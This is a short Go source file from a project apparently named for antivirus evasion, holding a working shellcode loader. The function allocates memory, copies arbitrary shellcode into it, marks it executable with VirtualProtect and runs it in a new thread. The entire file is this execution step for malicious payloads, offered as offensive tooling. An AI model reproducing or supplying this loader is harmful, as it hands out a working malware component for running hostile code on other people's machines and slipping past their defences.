package Loader

import (
	"GoAnti-VirusX/API"
	"golang.org/x/sys/windows"
	"unsafe"
)

func CreateThreadLoader(shellcode []byte) error {
	api, _ := API.SetWindowsAPI()

	address, err := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return err
	}

	_, _, err = api.RtlCopyMemory().Call(address, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil {
		return err
	}

	var oldProtect uint32
	err = windows.VirtualProtect(address, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		return err
	}

	thread, _, _ := api.CreateThread().Call(0, 0, address, uintptr(0), 0, 0)
	_, _ = windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)

	return nil
}
